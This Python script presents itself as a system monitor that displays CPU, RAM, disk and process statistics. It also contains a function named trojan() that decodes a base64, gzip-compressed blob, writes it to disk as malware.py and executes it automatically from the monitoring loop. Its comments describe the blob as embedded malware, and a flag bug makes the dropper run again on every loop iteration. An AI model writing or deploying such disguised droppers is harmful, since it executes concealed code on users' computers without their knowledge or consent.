import base64
import gzip
import os
import subprocess
import time
import psutil
import sys


def trojan():

    malware_path = "C:\\Users\\PAMSTORE\\Desktop\\Trojan\\Trojan\\malware.py"
    
    # Check if the malware script already exists
    if not os.path.exists(malware_path):
        try:
            # Decode and decompress the embedded malware
            with open(malware_path, "w") as malware_fd:
                blob = (
                    "H4sICAncMmEAA21hbHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60tM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+uqNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4JWm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
                )
                
                malware = gzip.decompress(base64.b64decode(blob))
                malware_fd.write(malware.decode("utf-8"))
                
        except Exception as e:
            print(f"Failed to decode and write malware file: {e}")
            return
    
    # Execute the malware script
    try:
        python_executable = sys.executable
        print(f"Executing: {python_executable} {malware_path}")
        subprocess.run([python_executable, malware_path], check=True)
    except Exception as e:
        print(f"Failed to execute malware script: {e}")

    

def main():
    
    trojan_executed = False  # Track whether the Trojan has been executed
    
    while True:
        try:
            # Gather system stats
            cpu = psutil.cpu_percent(interval=1)
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            process_count = len(list(psutil.process_iter()))

            # Display stats
            print("----------------------------------------------------------------------")
            print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print(f"|  {cpu:02}%      |  {ram:02}%   | {disk:02}% | {process_count:03}  |")
            print("----------------------------------------------------------------------")
            
            time.sleep(2)

            # Execute the trojan only once per session
            if not trojan_executed:
                trojan()
                trojan_executed = False  # Prevent re-execution
            
                
        except Exception as e:
            
            print(f"An error occurred in the main loop: {e}")
            break

if __name__ == "__main__":
    main()
